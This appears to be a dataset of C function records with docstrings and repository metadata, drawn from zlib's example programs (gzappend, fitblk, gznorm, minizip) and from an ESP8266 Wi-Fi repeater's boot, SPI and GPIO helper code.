{"docstring": "/* compress from file to def until provided buffer is full or end of\n   input reached; return last deflate() return value, or Z_ERRNO if\n   there was read error on the file */\n", "func_signal": "local int partcompress(FILE *in, z_streamp def)", "code": "{\n    int ret, flush;\n    unsigned char raw[RAWLEN];\n\n    flush = Z_NO_FLUSH;\n    do {\n        def->avail_in = fread(raw, 1, RAWLEN, in);\n        if (ferror(in))\n            return Z_ERRNO;\n        def->next_in = raw;\n        if (feof(in))\n            flush = Z_FINISH;\n        ret = deflate(def, flush);\n        assert(ret != Z_STREAM_ERROR);\n    } while (def->avail_out != 0 && flush == Z_NO_FLUSH);\n    return ret;\n}", "path": "zlib/examples/fitblk.c", "commit_date": "2011-09-10 00:00:00", "repo_name": "madler/zlib", "stars": 5169, "license": "other", "language": "c", "size": 3793}
{"docstring": "/* reload buffer */\n", "func_signal": "local int readin(file *in)", "code": "{\n    int len;\n\n    len = read(in->fd, in->buf, 1 << in->size);\n    if (len == -1) bye(\"error reading \", in->name);\n    in->left = (unsigned)len;\n    in->next = in->buf;\n    return len;\n}", "path": "zlib/examples/gzappend.c", "commit_date": "2017-10-13 00:00:00", "repo_name": "madler/zlib", "stars": 5169, "license": "other", "language": "c", "size": 3793}
{"docstring": "/* print nastygram and leave */\n", "func_signal": "local void quit(char *why)", "code": "{\n    fprintf(stderr, \"fitblk abort: %s\\n\", why);\n    exit(1);\n}", "path": "zlib/examples/fitblk.c", "commit_date": "2011-09-10 00:00:00", "repo_name": "madler/zlib", "stars": 5169, "license": "other", "language": "c", "size": 3793}
{"docstring": "/* skip over n bytes of in */\n", "func_signal": "local void skip(file *in, unsigned n)", "code": "{\n    unsigned bypass;\n\n    if (n > in->left) {\n        n -= in->left;\n        bypass = n & ~((1U << in->size) - 1);\n        if (bypass) {\n            if (lseek(in->fd, (off_t)bypass, SEEK_CUR) == -1)\n                bye(\"seeking \", in->name);\n            n -= bypass;\n        }\n        readmore(in);\n        if (n > in->left)\n            bye(\"unexpected end of \", in->name);\n    }\n    in->left -= n;\n    in->next += n;\n}", "path": "zlib/examples/gzappend.c", "commit_date": "2017-10-13 00:00:00", "repo_name": "madler/zlib", "stars": 5169, "license": "other", "language": "c", "size": 3793}
{"docstring": "/* process the compression level option if present, scan the gzip file, and\n   append the specified files, or append the data from stdin if no other file\n   names are provided on the command line -- the gzip file must be writable\n   and seekable */\n", "func_signal": "int main(int argc, char **argv)", "code": "{\n    int gd, level;\n    z_stream strm;\n\n    /* ignore command name */\n    argc--; argv++;\n\n    /* provide usage if no arguments */\n    if (*argv == NULL) {\n        printf(\n            \"gzappend 1.2 (11 Oct 2012) Copyright (C) 2003, 2012 Mark Adler\\n\"\n               );\n        printf(\n            \"usage: gzappend [-level] file.gz [ addthis [ andthis ... ]]\\n\");\n        return 0;\n    }\n\n    /* set compression level */\n    level = Z_DEFAULT_COMPRESSION;\n    if (argv[0][0] == '-') {\n        if (argv[0][1] < '0' || argv[0][1] > '9' || argv[0][2] != 0)\n            bye(\"invalid compression level\", \"\");\n        level = argv[0][1] - '0';\n        if (*++argv == NULL) bye(\"no gzip file name after options\", \"\");\n    }\n\n    /* prepare to append to gzip file */\n    gd = gzscan(*argv++, &strm, level);\n\n    /* append files on command line, or from stdin if none */\n    if (*argv == NULL)\n        gztack(NULL, gd, &strm, 1);\n    else\n        do {\n            gztack(*argv, gd, &strm, argv[1] == NULL);\n        } while (*++argv != NULL);\n    return 0;\n}", "path": "zlib/examples/gzappend.c", "commit_date": "2017-10-13 00:00:00", "repo_name": "madler/zlib", "stars": 5169, "license": "other", "language": "c", "size": 3793}
{"docstring": "/* recompress from inf's input to def's output; the input for inf and\n   the output for def are set in those structures before calling;\n   return last deflate() return value, or Z_MEM_ERROR if inflate()\n   was not able to allocate enough memory when it needed to */\n", "func_signal": "local int recompress(z_streamp inf, z_streamp def)", "code": "{\n    int ret, flush;\n    unsigned char raw[RAWLEN];\n\n    flush = Z_NO_FLUSH;\n    do {\n        /* decompress */\n        inf->avail_out = RAWLEN;\n        inf->next_out = raw;\n        ret = inflate(inf, Z_NO_FLUSH);\n        assert(ret != Z_STREAM_ERROR && ret != Z_DATA_ERROR &&\n               ret != Z_NEED_DICT);\n        if (ret == Z_MEM_ERROR)\n            return ret;\n\n        /* compress what was decompresed until done or no room */\n        def->avail_in = RAWLEN - inf->avail_out;\n        def->next_in = raw;\n        if (inf->avail_out != 0)\n            flush = Z_FINISH;\n        ret = deflate(def, flush);\n        assert(ret != Z_STREAM_ERROR);\n    } while (ret != Z_STREAM_END && def->avail_out != 0);\n    return ret;\n}", "path": "zlib/examples/fitblk.c", "commit_date": "2011-09-10 00:00:00", "repo_name": "madler/zlib", "stars": 5169, "license": "other", "language": "c", "size": 3793}
{"docstring": "/* print an error message and terminate with extreme prejudice */\n", "func_signal": "local void bye(char *msg1, char *msg2)", "code": "{\n    fprintf(stderr, \"gzappend error: %s%s\\n\", msg1, msg2);\n    exit(1);\n}", "path": "zlib/examples/gzappend.c", "commit_date": "2017-10-13 00:00:00", "repo_name": "madler/zlib", "stars": 5169, "license": "other", "language": "c", "size": 3793}
{"docstring": "/* rotate list[0..len-1] left by rot positions, in place */\n", "func_signal": "local void rotate(unsigned char *list, unsigned len, unsigned rot)", "code": "{\n    unsigned char tmp;\n    unsigned cycles;\n    unsigned char *start, *last, *to, *from;\n\n    /* normalize rot and handle degenerate cases */\n    if (len < 2) return;\n    if (rot >= len) rot %= len;\n    if (rot == 0) return;\n\n    /* pointer to last entry in list */\n    last = list + (len - 1);\n\n    /* do simple left shift by one */\n    if (rot == 1) {\n        tmp = *list;\n        memmove(list, list + 1, len - 1);\n        *last = tmp;\n        return;\n    }\n\n    /* do simple right shift by one */\n    if (rot == len - 1) {\n        tmp = *last;\n        memmove(list + 1, list, len - 1);\n        *list = tmp;\n        return;\n    }\n\n    /* otherwise do rotate as a set of cycles in place */\n    cycles = gcd(len, rot);             /* number of cycles */\n    do {\n        start = from = list + cycles;   /* start index is arbitrary */\n        tmp = *from;                    /* save entry to be overwritten */\n        for (;;) {\n            to = from;                  /* next step in cycle */\n            from += rot;                /* go right rot positions */\n            if (from > last) from -= len;   /* (pointer better not wrap) */\n            if (from == start) break;   /* all but one shifted */\n            *to = *from;                /* shift left */\n        }\n        *to = tmp;                      /* complete the circle */\n    } while (--cycles);\n}", "path": "zlib/examples/gzappend.c", "commit_date": "2017-10-13 00:00:00", "repo_name": "madler/zlib", "stars": 5169, "license": "other", "language": "c", "size": 3793}
{"docstring": "/* append file \"name\" to gzip file gd using deflate stream strm -- if last\n   is true, then finish off the deflate stream at the end */\n", "func_signal": "local void gztack(char *name, int gd, z_stream *strm, int last)", "code": "{\n    int fd, len, ret;\n    unsigned left;\n    unsigned char *in, *out;\n\n    /* open file to compress and append */\n    fd = 0;\n    if (name != NULL) {\n        fd = open(name, O_RDONLY, 0);\n        if (fd == -1)\n            fprintf(stderr, \"gzappend warning: %s not found, skipping ...\\n\",\n                    name);\n    }\n\n    /* allocate buffers */\n    in = malloc(CHUNK);\n    out = malloc(CHUNK);\n    if (in == NULL || out == NULL) bye(\"out of memory\", \"\");\n\n    /* compress input file and append to gzip file */\n    do {\n        /* get more input */\n        len = read(fd, in, CHUNK);\n        if (len == -1) {\n            fprintf(stderr,\n                    \"gzappend warning: error reading %s, skipping rest ...\\n\",\n                    name);\n            len = 0;\n        }\n        strm->avail_in = (unsigned)len;\n        strm->next_in = in;\n        if (len) strm->adler = crc32(strm->adler, in, (unsigned)len);\n\n        /* compress and write all available output */\n        do {\n            strm->avail_out = CHUNK;\n            strm->next_out = out;\n            ret = deflate(strm, last && len == 0 ? Z_FINISH : Z_NO_FLUSH);\n            left = CHUNK - strm->avail_out;\n            while (left) {\n                len = write(gd, out + CHUNK - strm->avail_out - left, left);\n                if (len == -1) bye(\"writing gzip file\", \"\");\n                left -= (unsigned)len;\n            }\n        } while (strm->avail_out == 0 && ret != Z_STREAM_END);\n    } while (len != 0);\n\n    /* write trailer after last entry */\n    if (last) {\n        deflateEnd(strm);\n        out[0] = (unsigned char)(strm->adler);\n        out[1] = (unsigned char)(strm->adler >> 8);\n        out[2] = (unsigned char)(strm->adler >> 16);\n        out[3] = (unsigned char)(strm->adler >> 24);\n        out[4] = (unsigned char)(strm->total_in);\n        out[5] = (unsigned char)(strm->total_in >> 8);\n        out[6] = (unsigned char)(strm->total_in >> 16);\n        out[7] = (unsigned char)(strm->total_in >> 24);\n        len = 8;\n        do {\n            ret = write(gd, out + 8 - len, len);\n            if (ret == -1) bye(\"writing gzip file\", \"\");\n            len -= ret;\n        } while (len);\n        close(gd);\n    }\n\n    /* clean up and return */\n    free(out);\n    free(in);\n    if (fd > 0) close(fd);\n}", "path": "zlib/examples/gzappend.c", "commit_date": "2017-10-13 00:00:00", "repo_name": "madler/zlib", "stars": 5169, "license": "other", "language": "c", "size": 3793}
{"docstring": "/* read from file in, exit if end-of-file */\n", "func_signal": "local int readmore(file *in)", "code": "{\n    if (readin(in) == 0) bye(\"unexpected end of \", in->name);\n    return 0;\n}", "path": "zlib/examples/gzappend.c", "commit_date": "2017-10-13 00:00:00", "repo_name": "madler/zlib", "stars": 5169, "license": "other", "language": "c", "size": 3793}
{"docstring": "// printf to an allocated string. Return the string, or NULL if the printf or\n// allocation fails.\n", "func_signal": "local char *aprintf(char *fmt, ...)", "code": "{\n    // Get the length of the result of the printf.\n    va_list args;\n    va_start(args, fmt);\n    int len = vsnprintf(NULL, 0, fmt, args);\n    va_end(args);\n    if (len < 0)\n        return NULL;\n\n    // Allocate the required space and printf to it.\n    char *str = malloc(len + 1);\n    if (str == NULL)\n        return NULL;\n    va_start(args, fmt);\n    vsnprintf(str, len + 1, fmt, args);\n    va_end(args);\n    return str;\n}", "path": "zlib/examples/gznorm.c", "commit_date": "2018-10-07 00:00:00", "repo_name": "madler/zlib", "stars": 5169, "license": "other", "language": "c", "size": 3793}
{"docstring": "// Normalize the gzip stream on stdin, writing the result to stdout.\n", "func_signal": "int main(void)", "code": "{\n    // Avoid end-of-line conversions on evil operating systems.\n    SET_BINARY_MODE(stdin);\n    SET_BINARY_MODE(stdout);\n\n    // Normalize from stdin to stdout, returning 1 on error, 0 if ok.\n    char *err;\n    int ret = gzip_normalize(stdin, stdout, &err);\n    if (ret)\n        fprintf(stderr, \"gznorm error: %s\\n\", err);\n    free(err);\n    return ret;\n}", "path": "zlib/examples/gznorm.c", "commit_date": "2018-10-07 00:00:00", "repo_name": "madler/zlib", "stars": 5169, "license": "other", "language": "c", "size": 3793}
{"docstring": "/* decompress gzip file \"name\", return strm with a deflate stream ready to\n   continue compression of the data in the gzip file, and return a file\n   descriptor pointing to where to write the compressed data -- the deflate\n   stream is initialized to compress using level \"level\" */\n", "func_signal": "local int gzscan(char *name, z_stream *strm, int level)", "code": "{\n    int ret, lastbit, left, full;\n    unsigned have;\n    unsigned long crc, tot;\n    unsigned char *window;\n    off_t lastoff, end;\n    file gz;\n\n    /* open gzip file */\n    gz.name = name;\n    gz.fd = open(name, O_RDWR, 0);\n    if (gz.fd == -1) bye(\"cannot open \", name);\n    gz.buf = malloc(CHUNK);\n    if (gz.buf == NULL) bye(\"out of memory\", \"\");\n    gz.size = LGCHUNK;\n    gz.left = 0;\n\n    /* skip gzip header */\n    gzheader(&gz);\n\n    /* prepare to decompress */\n    window = malloc(DSIZE);\n    if (window == NULL) bye(\"out of memory\", \"\");\n    strm->zalloc = Z_NULL;\n    strm->zfree = Z_NULL;\n    strm->opaque = Z_NULL;\n    ret = inflateInit2(strm, -15);\n    if (ret != Z_OK) bye(\"out of memory\", \" or library mismatch\");\n\n    /* decompress the deflate stream, saving append information */\n    lastbit = 0;\n    lastoff = lseek(gz.fd, 0L, SEEK_CUR) - gz.left;\n    left = 0;\n    strm->avail_in = gz.left;\n    strm->next_in = gz.next;\n    crc = crc32(0L, Z_NULL, 0);\n    have = full = 0;\n    do {\n        /* if needed, get more input */\n        if (strm->avail_in == 0) {\n            readmore(&gz);\n            strm->avail_in = gz.left;\n            strm->next_in = gz.next;\n        }\n\n        /* set up output to next available section of sliding window */\n        strm->avail_out = DSIZE - have;\n        strm->next_out = window + have;\n\n        /* inflate and check for errors */\n        ret = inflate(strm, Z_BLOCK);\n        if (ret == Z_STREAM_ERROR) bye(\"internal stream error!\", \"\");\n        if (ret == Z_MEM_ERROR) bye(\"out of memory\", \"\");\n        if (ret == Z_DATA_ERROR)\n            bye(\"invalid compressed data--format violated in\", name);\n\n        /* update crc and sliding window pointer */\n        crc = crc32(crc, window + have, DSIZE - have - strm->avail_out);\n        if (strm->avail_out)\n            have = DSIZE - strm->avail_out;\n        else {\n            have = 0;\n            full = 1;\n        }\n\n        /* process end of block */\n        if (strm->data_type & 128) {\n            if (strm->data_type & 64)\n                left = strm->data_type & 0x1f;\n            else {\n                lastbit = strm->data_type & 0x1f;\n                lastoff = lseek(gz.fd, 0L, SEEK_CUR) - strm->avail_in;\n            }\n        }\n    } while (ret != Z_STREAM_END);\n    inflateEnd(strm);\n    gz.left = strm->avail_in;\n    gz.next = strm->next_in;\n\n    /* save the location of the end of the compressed data */\n    end = lseek(gz.fd, 0L, SEEK_CUR) - gz.left;\n\n    /* check gzip trailer and save total for deflate */\n    if (crc != read4(&gz))\n        bye(\"invalid compressed data--crc mismatch in \", name);\n    tot = strm->total_out;\n    if ((tot & 0xffffffffUL) != read4(&gz))\n        bye(\"invalid compressed data--length mismatch in\", name);\n\n    /* if not at end of file, warn */\n    if (gz.left || readin(&gz))\n        fprintf(stderr,\n            \"gzappend warning: junk at end of gzip file overwritten\\n\");\n\n    /* clear last block bit */\n    lseek(gz.fd, lastoff - (lastbit != 0), SEEK_SET);\n    if (read(gz.fd, gz.buf, 1) != 1) bye(\"reading after seek on \", name);\n    *gz.buf = (unsigned char)(*gz.buf ^ (1 << ((8 - lastbit) & 7)));\n    lseek(gz.fd, -1L, SEEK_CUR);\n    if (write(gz.fd, gz.buf, 1) != 1) bye(\"writing after seek to \", name);\n\n    /* if window wrapped, build dictionary from window by rotating */\n    if (full) {\n        rotate(window, DSIZE, have);\n        have = DSIZE;\n    }\n\n    /* set up deflate stream with window, crc, total_in, and leftover bits */\n    ret = deflateInit2(strm, level, Z_DEFLATED, -15, 8, Z_DEFAULT_STRATEGY);\n    if (ret != Z_OK) bye(\"out of memory\", \"\");\n    deflateSetDictionary(strm, window, have);\n    strm->adler = crc;\n    strm->total_in = tot;\n    if (left) {\n        lseek(gz.fd, --end, SEEK_SET);\n        if (read(gz.fd, gz.buf, 1) != 1) bye(\"reading after seek on \", name);\n        deflatePrime(strm, 8 - left, *gz.buf);\n    }\n    lseek(gz.fd, end, SEEK_SET);\n\n    /* clean up and return */\n    free(window);\n    free(gz.buf);\n    return gz.fd;\n}", "path": "zlib/examples/gzappend.c", "commit_date": "2017-10-13 00:00:00", "repo_name": "madler/zlib", "stars": 5169, "license": "other", "language": "c", "size": 3793}
{"docstring": "/* calculate the CRC32 of a file,\n   because to encrypt a file, we need known the CRC32 of the file before */\n", "func_signal": "int getFileCrc(const char* filenameinzip,void*buf,unsigned long size_buf,unsigned long* result_crc)", "code": "{\n   unsigned long calculate_crc=0;\n   int err=ZIP_OK;\n   FILE * fin = FOPEN_FUNC(filenameinzip,\"rb\");\n\n   unsigned long size_read = 0;\n   unsigned long total_read = 0;\n   if (fin==NULL)\n   {\n       err = ZIP_ERRNO;\n   }\n\n    if (err == ZIP_OK)\n        do\n        {\n            err = ZIP_OK;\n            size_read = (int)fread(buf,1,size_buf,fin);\n            if (size_read < size_buf)\n                if (feof(fin)==0)\n            {\n                printf(\"error in reading %s\\n\",filenameinzip);\n                err = ZIP_ERRNO;\n            }\n\n            if (size_read>0)\n                calculate_crc = crc32(calculate_crc,buf,size_read);\n            total_read += size_read;\n\n        } while ((err == ZIP_OK) && (size_read>0));\n\n    if (fin)\n        fclose(fin);\n\n    *result_crc=calculate_crc;\n    printf(\"file %s crc %lx\\n\", filenameinzip, calculate_crc);\n    return err;\n}", "path": "zlib/contrib/minizip/minizip.c", "commit_date": "2012-01-21 00:00:00", "repo_name": "madler/zlib", "stars": 5169, "license": "other", "language": "c", "size": 3793}
{"docstring": "/* return the greatest common divisor of a and b using Euclid's algorithm,\n   modified to be fast when one argument much greater than the other, and\n   coded to avoid unnecessary swapping */\n", "func_signal": "local unsigned gcd(unsigned a, unsigned b)", "code": "{\n    unsigned c;\n\n    while (a && b)\n        if (a > b) {\n            c = b;\n            while (a - c >= c)\n                c <<= 1;\n            a -= c;\n        }\n        else {\n            c = a;\n            while (b - c >= c)\n                c <<= 1;\n            b -= c;\n        }\n    return a + b;\n}", "path": "zlib/examples/gzappend.c", "commit_date": "2017-10-13 00:00:00", "repo_name": "madler/zlib", "stars": 5169, "license": "other", "language": "c", "size": 3793}
{"docstring": "/* compress from stdin to fixed-size block on stdout */\n", "func_signal": "int main(int argc, char **argv)", "code": "{\n    int ret;                /* return code */\n    unsigned size;          /* requested fixed output block size */\n    unsigned have;          /* bytes written by deflate() call */\n    unsigned char *blk;     /* intermediate and final stream */\n    unsigned char *tmp;     /* close to desired size stream */\n    z_stream def, inf;      /* zlib deflate and inflate states */\n\n    /* get requested output size */\n    if (argc != 2)\n        quit(\"need one argument: size of output block\");\n    ret = strtol(argv[1], argv + 1, 10);\n    if (argv[1][0] != 0)\n        quit(\"argument must be a number\");\n    if (ret < 8)            /* 8 is minimum zlib stream size */\n        quit(\"need positive size of 8 or greater\");\n    size = (unsigned)ret;\n\n    /* allocate memory for buffers and compression engine */\n    blk = malloc(size + EXCESS);\n    def.zalloc = Z_NULL;\n    def.zfree = Z_NULL;\n    def.opaque = Z_NULL;\n    ret = deflateInit(&def, Z_DEFAULT_COMPRESSION);\n    if (ret != Z_OK || blk == NULL)\n        quit(\"out of memory\");\n\n    /* compress from stdin until output full, or no more input */\n    def.avail_out = size + EXCESS;\n    def.next_out = blk;\n    ret = partcompress(stdin, &def);\n    if (ret == Z_ERRNO)\n        quit(\"error reading input\");\n\n    /* if it all fit, then size was undersubscribed -- done! */\n    if (ret == Z_STREAM_END && def.avail_out >= EXCESS) {\n        /* write block to stdout */\n        have = size + EXCESS - def.avail_out;\n        if (fwrite(blk, 1, have, stdout) != have || ferror(stdout))\n            quit(\"error writing output\");\n\n        /* clean up and print results to stderr */\n        ret = deflateEnd(&def);\n        assert(ret != Z_STREAM_ERROR);\n        free(blk);\n        fprintf(stderr,\n                \"%u bytes unused out of %u requested (all input)\\n\",\n                size - have, size);\n        return 0;\n    }\n\n    /* it didn't all fit -- set up for recompression */\n    inf.zalloc = Z_NULL;\n    inf.zfree = Z_NULL;\n    inf.opaque = Z_NULL;\n    inf.avail_in = 0;\n    inf.next_in = Z_NULL;\n    ret = inflateInit(&inf);\n    tmp = malloc(size + EXCESS);\n    if (ret != Z_OK || tmp == NULL)\n        quit(\"out of memory\");\n    ret = deflateReset(&def);\n    assert(ret != Z_STREAM_ERROR);\n\n    /* do first recompression close to the right amount */\n    inf.avail_in = size + EXCESS;\n    inf.next_in = blk;\n    def.avail_out = size + EXCESS;\n    def.next_out = tmp;\n    ret = recompress(&inf, &def);\n    if (ret == Z_MEM_ERROR)\n        quit(\"out of memory\");\n\n    /* set up for next reocmpression */\n    ret = inflateReset(&inf);\n    assert(ret != Z_STREAM_ERROR);\n    ret = deflateReset(&def);\n    assert(ret != Z_STREAM_ERROR);\n\n    /* do second and final recompression (third compression) */\n    inf.avail_in = size - MARGIN;   /* assure stream will complete */\n    inf.next_in = tmp;\n    def.avail_out = size;\n    def.next_out = blk;\n    ret = recompress(&inf, &def);\n    if (ret == Z_MEM_ERROR)\n        quit(\"out of memory\");\n    assert(ret == Z_STREAM_END);    /* otherwise MARGIN too small */\n\n    /* done -- write block to stdout */\n    have = size - def.avail_out;\n    if (fwrite(blk, 1, have, stdout) != have || ferror(stdout))\n        quit(\"error writing output\");\n\n    /* clean up and print results to stderr */\n    free(tmp);\n    ret = inflateEnd(&inf);\n    assert(ret != Z_STREAM_ERROR);\n    ret = deflateEnd(&def);\n    assert(ret != Z_STREAM_ERROR);\n    free(blk);\n    fprintf(stderr,\n            \"%u bytes unused out of %u requested (%lu input)\\n\",\n            size - have, size, def.total_in);\n    return 0;\n}", "path": "zlib/examples/fitblk.c", "commit_date": "2011-09-10 00:00:00", "repo_name": "madler/zlib", "stars": 5169, "license": "other", "language": "c", "size": 3793}
{"docstring": "// get the rboot config\n", "func_signal": "rboot_config ICACHE_FLASH_ATTR rboot_get_config(void)", "code": "{\n\trboot_config conf;\n\tspi_flash_read(BOOT_CONFIG_SECTOR * SECTOR_SIZE, (uint32*)&conf, sizeof(rboot_config));\n\treturn conf;\n}", "path": "esp_wifi_repeater/user/rboot-api.c", "commit_date": "2018-09-01 00:00:00", "repo_name": "martin-ger/esp_wifi_repeater", "stars": 4621, "license": "mit", "language": "c", "size": 8095}
{"docstring": "// set current boot rom\n", "func_signal": "bool ICACHE_FLASH_ATTR rboot_set_current_rom(uint8 rom)", "code": "{\n\trboot_config conf;\n\tconf = rboot_get_config();\n\tif (rom >= conf.count) return false;\n\tconf.current_rom = rom;\n\treturn rboot_set_config(&conf);\n}", "path": "esp_wifi_repeater/user/rboot-api.c", "commit_date": "2018-09-01 00:00:00", "repo_name": "martin-ger/esp_wifi_repeater", "stars": 4621, "license": "mit", "language": "c", "size": 8095}
{"docstring": "////////////////////////////////////////////////////////////////////////////////\n//\n// Function Name: spi_tx_byte_order\n//   Description: Setup the byte order for shifting data out of buffer\n//    Parameters: spi_no - SPI (0) or HSPI (1)\n//\t\t\t\t  byte_order - SPI_BYTE_ORDER_HIGH_TO_LOW (1) \n//\t\t\t\t\t\t\t   Data is sent out starting with Bit31 and down to Bit0\n//\n//\t\t\t\t\t\t\t   SPI_BYTE_ORDER_LOW_TO_HIGH (0)\n//\t\t\t\t\t\t\t   Data is sent out starting with the lowest BYTE, from \n//\t\t\t\t\t\t\t   MSB to LSB, followed by the second lowest BYTE, from\n//\t\t\t\t\t\t\t   MSB to LSB, followed by the second highest BYTE, from\n//\t\t\t\t\t\t\t   MSB to LSB, followed by the highest BYTE, from MSB to LSB\n//\t\t\t\t\t\t\t   0xABCDEFGH would be sent as 0xGHEFCDAB\n//\n//\t\t\t\t \n////////////////////////////////////////////////////////////////////////////////\n", "func_signal": "void spi_tx_byte_order(uint8 spi_no, uint8 byte_order)", "code": "{\n\n\tif(spi_no > 1) return;\n\n\tif(byte_order){\n\t\tSET_PERI_REG_MASK(SPI_USER(spi_no), SPI_WR_BYTE_ORDER);\n\t} else {\n\t\tCLEAR_PERI_REG_MASK(SPI_USER(spi_no), SPI_WR_BYTE_ORDER);\n\t}\n}", "path": "esp_wifi_repeater/driver/spi.c", "commit_date": "2018-04-04 00:00:00", "repo_name": "martin-ger/esp_wifi_repeater", "stars": 4621, "license": "mit", "language": "c", "size": 8095}
{"docstring": "/**\n * Sets the pull up registers for a pin.\n */\n", "func_signal": "static void ICACHE_FLASH_ATTR\neasygpio_setupPullsByName(uint32_t gpio_name, EasyGPIO_PullStatus pullStatus)", "code": "{\n\n  if (EASYGPIO_PULLUP == pullStatus) {\n    PIN_PULLUP_EN(gpio_name);\n  } else {\n    PIN_PULLUP_DIS(gpio_name);\n  }\n}", "path": "esp_wifi_repeater/easygpio/easygpio.c", "commit_date": "2017-03-22 00:00:00", "repo_name": "martin-ger/esp_wifi_repeater", "stars": 4621, "license": "mit", "language": "c", "size": 8095}
{"docstring": "/**\n * Uniform way of setting GPIO output value. Handles GPIO 0-16.\n *\n * You can not rely on that this function will switch the gpio to an output like GPIO_OUTPUT_SET does.\n * Use easygpio_outputEnable() to change an input gpio to output mode.\n */\n", "func_signal": "void\neasygpio_outputSet(uint8_t gpio_pin, uint8_t value)", "code": "{\n  if (16==gpio_pin) {\n    WRITE_PERI_REG(RTC_GPIO_OUT,\n                   (READ_PERI_REG(RTC_GPIO_OUT) & 0xfffffffeUL) | (0x1UL & value));\n  } else {\n#ifdef EASYGPIO_USE_GPIO_OUTPUT_SET\n    GPIO_OUTPUT_SET(GPIO_ID_PIN(gpio_pin), value);\n#else\n    if (value&1){\n      WRITE_PERI_REG( PERIPHS_GPIO_BASEADDR, READ_PERI_REG(PERIPHS_GPIO_BASEADDR) | BIT(gpio_pin));\n    } else {\n      WRITE_PERI_REG( PERIPHS_GPIO_BASEADDR, READ_PERI_REG(PERIPHS_GPIO_BASEADDR) & ~BIT(gpio_pin));\n    }\n#endif\n  }\n}", "path": "esp_wifi_repeater/easygpio/easygpio.c", "commit_date": "2017-03-22 00:00:00", "repo_name": "martin-ger/esp_wifi_repeater", "stars": 4621, "license": "mit", "language": "c", "size": 8095}
{"docstring": "/**\n * Uniform way of getting GPIO input value. Handles GPIO 0-16.\n * The pin must be initiated with easygpio_pinMode() so that the pin mux is setup as a gpio in the first place.\n * If you know that you won't be using GPIO16 then you'd better off by just using GPIO_INPUT_GET().\n */\n", "func_signal": "uint8_t\neasygpio_inputGet(uint8_t gpio_pin)", "code": "{\n  if (16==gpio_pin) {\n    return (READ_PERI_REG(RTC_GPIO_IN_DATA) & 1UL);\n  } else {\n#ifdef EASYGPIO_USE_GPIO_INPUT_GET\n    return GPIO_INPUT_GET(GPIO_ID_PIN(gpio_pin));\n#else\n  // this does *not* work, maybe GPIO_IN_ADDRESS is the wrong address\n  return ((GPIO_REG_READ(GPIO_IN_ADDRESS) > gpio_pin)  & 1UL);\n#endif\n  }\n}", "path": "esp_wifi_repeater/easygpio/easygpio.c", "commit_date": "2017-03-22 00:00:00", "repo_name": "martin-ger/esp_wifi_repeater", "stars": 4621, "license": "mit", "language": "c", "size": 8095}
{"docstring": "////////////////////////////////////////////////////////////////////////////////\n//\n// Function Name: spi_init\n//   Description: Wrapper to setup HSPI/SPI GPIO pins and default SPI clock\n//    Parameters: spi_no - SPI (0) or HSPI (1)\n//\t\t\t\t \n////////////////////////////////////////////////////////////////////////////////\n", "func_signal": "void spi_init(uint8 spi_no)", "code": "{\n\t\n\tif(spi_no > 1) return; //Only SPI and HSPI are valid spi modules. \n\n\tspi_init_gpio(spi_no, SPI_CLK_USE_DIV);\n\tspi_clock(spi_no, SPI_CLK_PREDIV, SPI_CLK_CNTDIV);\n\tspi_tx_byte_order(spi_no, SPI_BYTE_ORDER_HIGH_TO_LOW);\n\tspi_rx_byte_order(spi_no, SPI_BYTE_ORDER_HIGH_TO_LOW); \n\n\tSET_PERI_REG_MASK(SPI_USER(spi_no), SPI_CS_SETUP|SPI_CS_HOLD);\n\tCLEAR_PERI_REG_MASK(SPI_USER(spi_no), SPI_FLASH_MODE);\n\n}", "path": "esp_wifi_repeater/driver/spi.c", "commit_date": "2018-04-04 00:00:00", "repo_name": "martin-ger/esp_wifi_repeater", "stars": 4621, "license": "mit", "language": "c", "size": 8095}
{"docstring": "////////////////////////////////////////////////////////////////////////////////\n//\n// Function Name: spi_rx_byte_order\n//   Description: Setup the byte order for shifting data into buffer\n//    Parameters: spi_no - SPI (0) or HSPI (1)\n//\t\t\t\t  byte_order - SPI_BYTE_ORDER_HIGH_TO_LOW (1) \n//\t\t\t\t\t\t\t   Data is read in starting with Bit31 and down to Bit0\n//\n//\t\t\t\t\t\t\t   SPI_BYTE_ORDER_LOW_TO_HIGH (0)\n//\t\t\t\t\t\t\t   Data is read in starting with the lowest BYTE, from \n//\t\t\t\t\t\t\t   MSB to LSB, followed by the second lowest BYTE, from\n//\t\t\t\t\t\t\t   MSB to LSB, followed by the second highest BYTE, from\n//\t\t\t\t\t\t\t   MSB to LSB, followed by the highest BYTE, from MSB to LSB\n//\t\t\t\t\t\t\t   0xABCDEFGH would be read as 0xGHEFCDAB\n//\n//\t\t\t\t \n////////////////////////////////////////////////////////////////////////////////\n", "func_signal": "void spi_rx_byte_order(uint8 spi_no, uint8 byte_order)", "code": "{\n\n\tif(spi_no > 1) return;\n\n\tif(byte_order){\n\t\tSET_PERI_REG_MASK(SPI_USER(spi_no), SPI_RD_BYTE_ORDER);\n\t} else {\n\t\tCLEAR_PERI_REG_MASK(SPI_USER(spi_no), SPI_RD_BYTE_ORDER);\n\t}\n}", "path": "esp_wifi_repeater/driver/spi.c", "commit_date": "2018-04-04 00:00:00", "repo_name": "martin-ger/esp_wifi_repeater", "stars": 4621, "license": "mit", "language": "c", "size": 8095}
{"docstring": "/**\n * Uniform way of turning an output GPIO pin into input mode. Handles GPIO 0-16.\n * The pin must be initiated with easygpio_pinMode() so that the pin mux is setup as a gpio in the first place.\n * This function does the same thing as GPIO_DIS_OUTPUT, but works on GPIO16 too.\n */\n", "func_signal": "void easygpio_outputDisable(uint8_t gpio_pin)", "code": "{\n  if (16==gpio_pin) {\n    WRITE_PERI_REG(RTC_GPIO_ENABLE,\n        READ_PERI_REG(RTC_GPIO_ENABLE) & 0xfffffffeUL);  //out disable\n  } else {\n    GPIO_DIS_OUTPUT(GPIO_ID_PIN(gpio_pin));\n  }\n}", "path": "esp_wifi_repeater/easygpio/easygpio.c", "commit_date": "2017-03-22 00:00:00", "repo_name": "martin-ger/esp_wifi_repeater", "stars": 4621, "license": "mit", "language": "c", "size": 8095}
